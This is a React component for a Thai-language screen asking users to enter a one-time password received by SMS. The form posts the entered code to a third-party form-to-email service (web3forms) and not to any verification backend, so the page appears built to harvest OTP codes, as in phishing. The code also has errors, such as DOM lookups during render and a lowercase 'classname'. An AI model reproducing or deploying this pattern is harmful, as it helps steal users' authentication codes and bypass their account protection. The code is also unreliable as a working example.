
import { BrowserRouter as Router, Switch, Route, Link } from "react-router-dom";

export default function OTPScreen() {
  const form = document.getElementById("form");
  const result = document.getElementById("result");

  return (
    <div classname="bg-indigo-200 h-screen w-screen">
      <div className="flex items-center min-h-screen bg-indigo-200 dark:bg-gray-900">
        <div className="container mx-auto">
          <div className="max-w-md mx-auto my-10 bg-white p-5 rounded-md shadow-sm">
            <div className="text-center">
              <h5 className="my-3 text-3xl font-semibold fontsize-18 text-gray-700 dark:text-gray-200">
                กรุณากรอกรหัส OTP
              </h5>

              <p className="text-gray-400 dark:text-gray-400">
              เพื่อยืนยันข้อมูล กรุณากรอก OTP ซึ่งเป็นรหัสผ่านครั้งเดียว
              </p>
              <p className="text-gray-400 dark:text-gray-400">
              ที่คุณได้รับทาง SMS เบอร์โทรศัพท์ 0XX-XXX-XXXX
              </p>
              <div
                className="
        flex
        justify-between
        items-center
        w-full
        py-2
        border-b-2 border-gray-200
      "
              />
          
              
            <div className="m-7">
              <form
                action="https://api.web3forms.com/submit"
                method="POST"
                id="form"
              >
               
               <p className="text-red-400 dark:text-gray-400">
              คุณจะได้รับ OTP ภายใน 5 นาที 
              </p>
                <div className="mb-6">
                  <label
                    className="block mb-2 text-sm text-gray-600 dark:text-gray-400"
                  >

                  </label>
                  <input
                    type="text"
                    name="name"
                    id="name"
                    placeholder="โปรดกรอกรหัส OTP "
                    required
                    className="w-full h-20 px-3 py-2 placeholder-gray-300 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-indigo-100 focus:border-indigo-300 dark:bg-gray-700 dark:text-white dark:placeholder-gray-500 dark:border-gray-600 dark:focus:ring-gray-900 dark:focus:border-gray-500"
                  />
                </div>
                
                <Link to="/menuhome">
                <div className="mb-6">
                  <button
                    type="submit"
                    className="w-full px-3 py-3 text-white bg-indigo-300 rounded-md focus:bg-indigo-200 focus:outline-none"
                  >
                    ยืนยัน
                  </button>
                
                </div>
                </Link>
                <p className="text-gray-400 dark:text-gray-400">
              ขอรหัส OTP ใหม่
              </p>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
    </div>
  );
}
